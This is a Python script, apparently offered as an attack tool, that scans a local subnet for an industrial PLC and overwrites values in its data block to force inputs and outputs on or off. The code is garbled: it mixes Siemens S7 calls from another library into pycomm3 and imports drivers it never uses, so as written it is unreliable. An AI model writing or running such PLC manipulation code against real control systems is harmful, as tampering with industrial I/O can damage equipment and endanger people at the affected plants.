import socket
import pycomm3
from pycomm3 import LogixDriver, SLC500Driver, PLC

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the subnet and range to scan
    subnet = "192.168.1."
    start_ip = 1
    end_ip = 254

    for i in range(start_ip, end_ip + 1):
        ip = f"{subnet}{i}"
        try:
            # Attempt to connect to the PLC
            with pycomm3.S7Client() as client:
                client.connect(ip, 0, 1)
                if client.get_connected():
                    print(f"PLC found at IP: {ip}")
                    return ip
        except Exception as e:
            print(f"Failed to connect to {ip}: {e}")
    return None

# Function to manipulate the I/O image
def manipulate_io_image(plc_ip, input_address, output_address, input_value, output_value):
    try:
        with pycomm3.S7Client() as client:
            client.connect(plc_ip, 0, 1)
            if client.get_connected():
                print(f"Connected to PLC at IP: {plc_ip}")

                # Override the input value
                client.write_area(pycomm3.s7.S7AreaDB, 1, input_address, [input_value])
                print(f"Input at address {input_address} overridden to {input_value}")

                # Override the output value
                client.write_area(pycomm3.s7.S7AreaDB, 1, output_address, [output_value])
                print(f"Output at address {output_address} overridden to {output_value}")

            else:
                print("Failed to connect to the PLC")
    except Exception as e:
        print(f"Error manipulating I/O image: {e}")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip is None:
        print("PLC not found in the specified range")
        return

    # Define the I/O addresses and values to manipulate
    input_address = 0  # Example input address
    output_address = 1  # Example output address
    input_value = 1  # Example input value (1 for ON, 0 for OFF)
    output_value = 0  # Example output value (1 for ON, 0 for OFF)

    # Manipulate the I/O image
    manipulate_io_image(plc_ip, input_address, output_address, input_value, output_value)

if __name__ == "__main__":
    main()